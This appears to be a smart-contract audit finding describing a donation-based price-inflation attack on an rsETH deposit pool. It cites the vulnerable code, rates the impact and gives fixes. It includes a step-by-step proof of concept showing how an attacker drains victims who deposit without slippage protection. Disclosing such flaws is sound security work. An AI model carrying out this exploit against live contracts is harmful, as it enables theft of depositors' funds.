### Title
rsETH Price Inflation via Direct Token Donation to `LRTDepositPool` - (File: contracts/LRTDepositPool.sol)

### Summary
An attacker can manipulate the rsETH exchange rate by directly transferring LST tokens (or ETH) to the `LRTDepositPool` contract without going through `depositAsset()`. Because `getAssetDistributionData()` uses raw `balanceOf(address(this))` to count protocol assets, the donated tokens inflate `totalETHInProtocol`, which in turn inflates `rsETHPrice` after `updateRSETHPrice()` is called. Subsequent depositors who set `minRSETHAmountExpected = 0` receive zero rsETH and permanently lose their deposited assets to the attacker.

### Finding Description

`LRTDepositPool.getAssetDistributionData()` counts assets lying in the deposit pool using the raw ERC-20 balance:

```solidity
assetLyingInDepositPool = IERC20(asset).balanceOf(address(this));
``` [1](#0-0) 

For ETH, the same pattern applies:

```solidity
ethLyingInDepositPool = address(this).balance;
``` [2](#0-1) 

These raw balances feed directly into `LRTOracle._getTotalEthInProtocol()`:

```solidity
uint256 totalAssetAmt = ILRTDepositPool(lrtDepositPoolAddr).getTotalAssetDeposits(asset);
totalETHInProtocol += totalAssetAmt.mulWad(assetER);
``` [3](#0-2) 

Which is then used to compute the new rsETH price:

```solidity
uint256 newRsETHPrice = (totalETHInProtocol - protocolFeeInETH).divWad(rsethSupply);
``` [4](#0-3) 

The rsETH minting formula in `getRsETHAmountToMint()` divides by this stored price:

```solidity
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
``` [5](#0-4) 

If `rsETHPrice` is artificially inflated, `rsethAmountToMint` rounds down to zero for any deposit smaller than the inflated price unit.

The `_beforeDeposit` slippage guard only reverts if `rsethAmountToMint < minRSETHAmountExpected`:

```solidity
if (rsethAmountToMint < minRSETHAmountExpected) {
    revert MinimumAmountToReceiveNotMet();
}
``` [6](#0-5) 

When `minRSETHAmountExpected = 0`, a zero-rsETH mint passes silently, and the depositor's assets are absorbed into the pool with no shares issued.

### Impact Explanation

**Critical — Direct theft of user funds.**

A victim who deposits with `minRSETHAmountExpected = 0` (a common default in integrations and scripts) receives zero rsETH while their full LST/ETH deposit is credited to the pool. The attacker, holding the only outstanding rsETH, redeems it after calling `updateRSETHPrice()` again and receives the original donation plus all victim deposits. The victim's funds are permanently lost with no recovery path.

### Likelihood Explanation

**Medium-High.** The attack requires:
1. The attacker to hold enough LST to make a donation proportional to the target victim deposit (cost equals expected gain — same economics as the ConicPool report).
2. `pricePercentageLimit` to be unset (`== 0`, which is the default storage value) or the attacker to spread the price increase across multiple days.
3. At least one victim to call `depositAsset` with `minRSETHAmountExpected = 0`.

Condition 3 is realistic: many protocol integrations, scripts, and early depositors omit slippage protection. Condition 2 is the default state at deployment. The attack is most dangerous at protocol launch when `rsethSupply` is near zero and the price is most sensitive to donations.

### Recommendation

Replace raw `balanceOf` accounting with an internal deposit ledger that tracks only assets received through `depositAsset()` / `depositETH()`. Alternatively, adopt a virtual-shares offset (as in OZ ERC-4626 v4.9) so that a donation of size `D` requires the attacker to lose `D / (1 + virtualShares)` to the protocol, making the attack unprofitable. At minimum, enforce a non-zero `minRSETHAmountExpected` at the contract level (e.g., require `rsethAmountToMint > 0`) and ensure `pricePercentageLimit` is set to a safe value before the first public deposit.

### Proof of Concept

```
// Preconditions: rsethSupply = 0, rsETHPrice = 1e18, pricePercentageLimit = 0

// Step 1 — Attacker seeds the pool with 1 wei stETH to obtain 1 wei rsETH
vm.startPrank(attacker);
stETH.approve(address(lrtDepositPool), 1);
lrtDepositPool.depositAsset(stETH, 1, 0, "");
// rsethSupply = 1, rsETHPrice = 1e18 (stored, not yet updated)

// Step 2 — Attacker donates X stETH directly (no depositAsset call)
stETH.transfer(address(lrtDepositPool), X);
// balanceOf(lrtDepositPool) is now 1 + X, but rsethSupply is still 1

// Step 3 — Attacker triggers price update
lrtOracle.updateRSETHPrice();
// totalETHInProtocol ≈ (1 + X) * assetPrice
// newRsETHPrice ≈ (1 + X) * 1e18
// rsETHPrice is now massively inflated
vm.stopPrank();

// Step 4 — Victim deposits Y stETH with no slippage protection
vm.startPrank(victim);
stETH.approve(address(lrtDepositPool), Y);
lrtDepositPool.depositAsset(stETH, Y, 0 /* minRSETHAmountExpected = 0 */, "");
// rsethAmountToMint = Y * 1e18 / ((1+X)*1e18) = Y/(1+X) → rounds to 0 if X >> Y
// Victim deposits Y stETH and receives 0 rsETH
vm.stopPrank();

// Step 5 — Attacker updates price again to include victim's deposit
vm.startPrank(attacker);
lrtOracle.updateRSETHPrice();
// newRsETHPrice ≈ (1 + X + Y) * 1e18

// Step 6 — Attacker redeems 1 wei rsETH
lrtWithdrawalManager.initiateWithdrawal(stETH, 1);
// expectedAssetAmount = 1 * rsETHPrice / assetPrice = 1 + X + Y stETH
// Attacker recovers donation X + victim deposit Y + original 1 wei
vm.stopPrank();
```

### Citations

**File:** contracts/LRTDepositPool.sol (L444-444)
```text
        assetLyingInDepositPool = IERC20(asset).balanceOf(address(this));
```

**File:** contracts/LRTDepositPool.sol (L480-480)
```text
        ethLyingInDepositPool = address(this).balance;
```

**File:** contracts/LRTDepositPool.sol (L520-520)
```text
        rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
```

**File:** contracts/LRTDepositPool.sol (L667-669)
```text
        if (rsethAmountToMint < minRSETHAmountExpected) {
            revert MinimumAmountToReceiveNotMet();
        }
```

**File:** contracts/LRTOracle.sol (L250-250)
```text
        uint256 newRsETHPrice = (totalETHInProtocol - protocolFeeInETH).divWad(rsethSupply);
```

**File:** contracts/LRTOracle.sol (L341-343)
```text
            uint256 totalAssetAmt = ILRTDepositPool(lrtDepositPoolAddr).getTotalAssetDeposits(asset);

            totalETHInProtocol += totalAssetAmt.mulWad(assetER);
```
